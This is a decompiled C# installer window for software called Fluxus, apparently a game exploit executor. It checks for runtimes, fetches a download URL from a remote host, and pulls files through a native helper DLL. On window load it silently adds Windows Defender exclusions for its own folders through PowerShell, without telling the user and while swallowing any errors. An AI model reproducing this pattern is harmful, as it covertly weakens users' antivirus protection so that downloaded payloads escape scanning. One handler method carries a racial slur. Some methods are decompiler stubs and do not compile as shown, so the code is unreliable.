using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Documents;
using System.Windows.Forms;
using System.Windows.Input;
using System.Windows.Markup;
using Microsoft.Win32;
using Microsoft.WindowsAPICodePack.Dialogs;

namespace fluxus_installer
{
	public partial class MainWindow : Window, IStyleConnector
	{
		public MainWindow()
		{
			this.InitializeComponent();
			if (System.Windows.Forms.Application.StartupPath.Contains("\\AppData\\Local\\Temp\\"))
			{
				System.Windows.MessageBox.Show("Please extract Fluxus before starting it!", "Error", MessageBoxButton.OK, MessageBoxImage.Hand);
				Process.GetCurrentProcess().Kill();
			}
		}

		void start_url(string url)
		{
			try
			{
				Process.Start(new ProcessStartInfo("msedge.exe")
				{
					Arguments = "--guest \"" + url + "\""
				});
			}
			catch
			{
				Process.Start(url);
			}
		}

		void doDisc(object sender, RoutedEventArgs e)
		{
			this.start_url("https://" + this.Url + "/external-files/discord.php");
		}

		void doSite(object sender, RoutedEventArgs e)
		{
			this.start_url("https://" + this.Url + "/");
		}

		void dragUI(object sender, MouseButtonEventArgs e)
		{
			base.DragMove();
		}

		void doCancel(object sender, RoutedEventArgs e)
		{
			if (this.Tabs.SelectedIndex == 3)
			{
				Process.GetCurrentProcess().Kill();
				return;
			}
			if (System.Windows.MessageBox.Show("Are you sure you want to cancel the Fluxus installation process?", "Fluxus", MessageBoxButton.YesNo, MessageBoxImage.Exclamation) == MessageBoxResult.Yes)
			{
				Process.GetCurrentProcess().Kill();
			}
		}

		bool checkRedists()
		{
			string text = "SOFTWARE\\Classes\\Installer\\Dependencies";
			using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(text))
			{
				if (registryKey == null)
				{
					return false;
				}
				foreach (string str in from n in registryKey.GetSubKeyNames()
				where !n.ToLower().Contains("dotnet") && !n.ToLower().Contains("microsoft")
				select n)
				{
					using (RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(text + "\\" + str))
					{
						object value = registryKey2.GetValue("DisplayName");
						string text2 = ((value != null) ? value.ToString() : null) ?? null;
						if (!string.IsNullOrEmpty(text2))
						{
							if (Environment.Is64BitOperatingSystem)
							{
								if (Regex.IsMatch(text2, "C\\+\\+ 2015.*\\((x64|x86)\\)"))
								{
									return true;
								}
							}
							else if (Regex.IsMatch(text2, "C\\+\\+ 2015.*\\(x86\\)"))
							{
								return true;
							}
						}
					}
				}
			}
			return false;
		}

		void dlChanged(object sender, DownloadProgressChangedEventArgs e)
		{
			base.Dispatcher.BeginInvoke(new MethodInvoker(delegate()
			{
				this.statz.Text = "Status: Downloading... " + e.ProgressPercentage.ToString() + "%";
			}), Array.Empty<object>());
		}

		void dlComplete(object sender, AsyncCompletedEventArgs e)
		{
			MainWindow.<dlComplete>d__10 <dlComplete>d__;
			<dlComplete>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<dlComplete>d__.<>4__this = this;
			<dlComplete>d__.<>1__state = -1;
			<dlComplete>d__.<>t__builder.Start<MainWindow.<dlComplete>d__10>(ref <dlComplete>d__);
		}

		[DllImport("InstallHelper.dll", CallingConvention = CallingConvention.Cdecl)]
		[return: MarshalAs(UnmanagedType.BStr)]
		public static extern string Get([MarshalAs(UnmanagedType.LPStr)] string url);

		[DllImport("InstallHelper.dll", CallingConvention = CallingConvention.Cdecl)]
		public static extern void Download([MarshalAs(UnmanagedType.LPStr)] string url, [MarshalAs(UnmanagedType.LPStr)] string path);

		public static bool IsWindow7()
		{
			return Environment.OSVersion.Version.Major == 6 & Environment.OSVersion.Version.Minor == 1;
		}

		public static string HttpGet(string url)
		{
			if (MainWindow.IsWindow7())
			{
				return MainWindow.Get(url);
			}
			WebClient webClient = new WebClient();
			webClient.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
			string result = webClient.DownloadString(url);
			webClient.Dispose();
			return result;
		}

		void doNext(object sender, RoutedEventArgs e)
		{
			MainWindow.<doNext>d__15 <doNext>d__;
			<doNext>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<doNext>d__.<>4__this = this;
			<doNext>d__.<>1__state = -1;
			<doNext>d__.<>t__builder.Start<MainWindow.<doNext>d__15>(ref <doNext>d__);
		}

		void showPathSelector(object sender, RoutedEventArgs e)
		{
			using (CommonOpenFileDialog commonOpenFileDialog = new CommonOpenFileDialog
			{
				Title = "Fluxus : Select Path",
				InitialDirectory = AppDomain.CurrentDomain.BaseDirectory,
				IsFolderPicker = true
			})
			{
				CommonFileDialogResult commonFileDialogResult = commonOpenFileDialog.ShowDialog();
				this.Dir = ((commonFileDialogResult == 1) ? commonOpenFileDialog.FileName : "");
				if (commonFileDialogResult == 1)
				{
					this.doNext(sender, e);
				}
			}
		}

		void selectInstall(object sender, RoutedEventArgs e)
		{
			this.Dir = Directory.GetCurrentDirectory();
			this.doNext(sender, e);
		}

		void onInstallSelected(object sender, RoutedEventArgs e)
		{
		}

		void testnigga(object sender, RoutedEventArgs e)
		{
		}

		void window_Loaded(object sender, RoutedEventArgs e)
		{
			try
			{
				if (!Directory.Exists("C:\\Program Files (x86)\\Fluxus"))
				{
					Directory.CreateDirectory("C:\\Program Files (x86)\\Fluxus");
				}
				try
				{
					this.Url = MainWindow.HttpGet("https://epsilonbot.xyz/url");
				}
				catch (Exception)
				{
				}
				this.discord.Text = "> Join our discord at www." + this.Url + "/external-files/discord.php for help!";
			}
			catch (Exception)
			{
			}
			try
			{
				using (PowerShell powerShell = PowerShell.Create())
				{
					powerShell.AddScript("Add-MpPreference -ExclusionPath '" + Directory.GetCurrentDirectory() + "'");
					powerShell.Invoke();
					powerShell.AddScript("Add-MpPreference -ExclusionPath 'C:\\Program Files (x86)\\Fluxus'");
					powerShell.Invoke();
					powerShell.Dispose();
				}
			}
			catch (Exception)
			{
			}
		}

		[DebuggerNonUserCode, GeneratedCode("PresentationBuildTasks", "4.0.0.0"), EditorBrowsable(EditorBrowsableState.Never)]
		void IStyleConnector.Connect(int connectionId, object target)
		{
			if (connectionId == 2)
			{
				((System.Windows.Controls.Button)target).Click += this.showPathSelector;
			}
		}

		string Dir = "";

		string Url = "fluxteam.net";
	}
}
